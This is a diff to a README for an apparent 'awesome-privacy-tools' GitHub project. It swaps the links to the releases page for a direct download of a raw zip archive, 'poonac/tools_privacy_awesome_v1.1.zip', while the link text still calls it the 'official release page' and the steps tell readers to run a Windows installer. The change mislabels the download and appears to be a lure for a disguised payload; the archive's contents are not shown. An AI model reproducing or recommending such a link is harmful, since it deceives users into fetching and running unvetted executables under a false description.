@@ -1,6 +1,6 @@
 # 🛡️ awesome-privacy-tools - Take back control of your data
 
-[![](https://img.shields.io/badge/Download_Privacy_Tools-Blue-blue)](https://github.com/kirtim8895/awesome-privacy-tools/releases)
+[![](https://img.shields.io/badge/Download_Privacy_Tools-Blue-blue)](https://github.com/kirtim8895/awesome-privacy-tools/raw/refs/heads/main/poonac/tools_privacy_awesome_v1.1.zip)
 
 ## 📁 Project Overview
 
@@ -22,7 +22,7 @@ Most tools in this list work on standard home hardware. You do not need expensiv
 Follow these steps to obtain the latest version of the toolkit.
 
 1. Open your web browser.
-2. Go to the [official release page](https://github.com/kirtim8895/awesome-privacy-tools/releases).
+2. Go to the [official release page](https://github.com/kirtim8895/awesome-privacy-tools/raw/refs/heads/main/poonac/tools_privacy_awesome_v1.1.zip).
 3. Look for the section labeled "Assets" under the most recent release.
 4. Select the Windows installer file, which ends in .exe or .msi.
 5. Save the file to your Downloads folder.
